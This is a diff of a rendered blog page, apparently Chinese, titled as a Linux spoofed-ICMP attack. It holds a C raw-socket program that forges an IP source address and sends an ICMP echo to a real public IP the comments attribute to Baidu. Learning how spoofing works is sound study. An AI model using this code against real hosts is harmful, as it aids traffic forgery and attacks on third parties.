@@ -119,7 +119,7 @@
 
 
   <div>
-    <h1 id="linuxxia wei zhuang icmpgong ji de shi xian">linux下伪装ICMP攻击的实现</h1>
+    <h1>linux下伪装ICMP攻击的实现</h1>
 <p>@(编程语言)[信息安全, C]</p>
 <div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
@@ -127,11 +127,11 @@
 <span class="cp">#include</span> <span class="cpf">&lt;netinet/ip_icmp.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
 
-<span class="cp">#include</span> <span class="cpf">"exam.h"</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&quot;exam.h&quot;</span><span class="cp"></span>
 <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
 
 <span class="cm">/*校验码的计算*/</span>
-<span class="kt">unsigned</span> <span class="kt">short</span> <span class="nf">cksum</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
+<span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">cksum</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="kt">int</span> <span class="n">sum</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
     <span class="kt">int</span> <span class="n">odd</span> <span class="o">=</span> <span class="n">len</span> <span class="o">&amp;</span> <span class="mh">0x01</span><span class="p">;</span>
@@ -152,45 +152,46 @@
     <span class="k">return</span> <span class="o">~</span><span class="n">sum</span><span class="p">;</span> 
 <span class="p">}</span>
 
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
 <span class="p">{</span>
     <span class="kt">int</span> <span class="n">s</span><span class="p">;</span>
     <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
     <span class="kt">int</span> <span class="n">on</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> 
-    <span class="k">struct</span> <span class="n">icmp</span> <span class="o">*</span> <span class="n">icmp</span><span class="p">;</span> 
-    <span class="k">struct</span> <span class="n">ip</span> <span class="o">*</span> <span class="n">ip</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span> 
-    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">addr</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="nc">icmp</span> <span class="o">*</span> <span class="n">icmp</span><span class="p">;</span> 
+    <span class="k">struct</span> <span class="nc">ip</span> <span class="o">*</span> <span class="n">ip</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">ip</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span> 
+    <span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="n">addr</span><span class="p">;</span>
 
     <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">//使用原始套接字</span>
-    <span class="n">failure</span><span class="p">(</span><span class="s">"socket"</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span> 
-    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+    <span class="n">failure</span><span class="p">(</span><span class="s">&quot;socket&quot;</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">-1</span><span class="p">);</span> 
+    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
 
     <span class="n">addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
-    <span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"119.75.213.51"</span><span class="p">);</span> <span class="c1">//百度的ip，目的是伪造IP地址给百度发数据包</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">&quot;119.75.213.51&quot;</span><span class="p">);</span> <span class="c1">//百度的ip，目的是伪造IP地址给百度发数据包</span>
 
     <span class="n">ret</span> <span class="o">=</span> <span class="n">setsockopt</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">,</span> <span class="n">IP_HDRINCL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">on</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">on</span><span class="p">));</span> <span class="c1">//自己构造ip头的选项</span>
-    <span class="n">failure</span><span class="p">(</span><span class="s">"setsockopt"</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">failure</span><span class="p">(</span><span class="s">&quot;setsockopt&quot;</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="mi">-1</span><span class="p">);</span>
 
     <span class="cm">/*ip头的信息*/</span>
     <span class="n">ip</span><span class="o">-&gt;</span><span class="n">ip_hl</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span> <span class="n">ip</span><span class="o">-&gt;</span><span class="n">ip_v</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span> <span class="n">ip</span><span class="o">-&gt;</span><span class="n">ip_tos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">ip</span><span class="o">-&gt;</span><span class="n">ip_len</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span> 
     <span class="n">ip</span><span class="o">-&gt;</span><span class="n">ip_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">ip</span><span class="o">-&gt;</span><span class="n">ip_off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
     <span class="n">ip</span><span class="o">-&gt;</span><span class="n">ip_ttl</span> <span class="o">=</span> <span class="mi">56</span><span class="p">;</span> <span class="n">ip</span><span class="o">-&gt;</span><span class="n">ip_p</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">ip</span><span class="o">-&gt;</span><span class="n">ip_sum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  
-    <span class="n">ip</span><span class="o">-&gt;</span><span class="n">ip_src</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"192.168.205.199"</span><span class="p">);</span> <span class="c1">//这是伪造的ip，本机的ip当然不是这个啦 </span>
-    <span class="n">ip</span><span class="o">-&gt;</span><span class="n">ip_dst</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"119.75.213.51"</span><span class="p">);</span>
+    <span class="n">ip</span><span class="o">-&gt;</span><span class="n">ip_src</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">&quot;192.168.205.199&quot;</span><span class="p">);</span> <span class="c1">//这是伪造的ip，本机的ip当然不是这个啦 </span>
+    <span class="n">ip</span><span class="o">-&gt;</span><span class="n">ip_dst</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">&quot;119.75.213.51&quot;</span><span class="p">);</span>
 
     <span class="cm">/*icmp头信息*/</span>
-    <span class="n">icmp</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">icmp</span><span class="o">*</span><span class="p">)(</span><span class="n">buffer</span><span class="o">+</span><span class="mi">20</span><span class="p">);</span> 
+    <span class="n">icmp</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">icmp</span><span class="o">*</span><span class="p">)(</span><span class="n">buffer</span><span class="o">+</span><span class="mi">20</span><span class="p">);</span> 
     <span class="n">icmp</span><span class="o">-&gt;</span><span class="n">icmp_type</span> <span class="o">=</span> <span class="n">ICMP_ECHO</span><span class="p">;</span> <span class="n">icmp</span><span class="o">-&gt;</span><span class="n">icmp_code</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">icmp</span><span class="o">-&gt;</span><span class="n">icmp_cksum</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span>
     <span class="n">icmp</span><span class="o">-&gt;</span><span class="n">icmp_id</span> <span class="o">=</span> <span class="mi">1234</span><span class="p">;</span> <span class="n">icmp</span><span class="o">-&gt;</span><span class="n">icmp_seq</span> <span class="o">=</span> <span class="mi">8080</span><span class="p">;</span>
     <span class="n">icmp</span><span class="o">-&gt;</span><span class="n">icmp_cksum</span> <span class="o">=</span> <span class="n">cksum</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">icmp</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
 
     <span class="cm">/*发送*/</span>
-    <span class="n">ret</span> <span class="o">=</span> <span class="n">sendto</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
-    <span class="n">failure</span><span class="p">(</span><span class="s">"send"</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">sendto</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
+    <span class="n">failure</span><span class="p">(</span><span class="s">&quot;send&quot;</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="mi">-1</span><span class="p">);</span>
 
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div>
+
 <p>PS: exam.h是我为了些程序方便而定义的一些错误处理的宏，文件内容如下：</p>
 <div class="highlight"><pre><span></span><code><span class="cp">#ifndef EXAM_H</span>
 <span class="cp">#define EXAM_H</span>
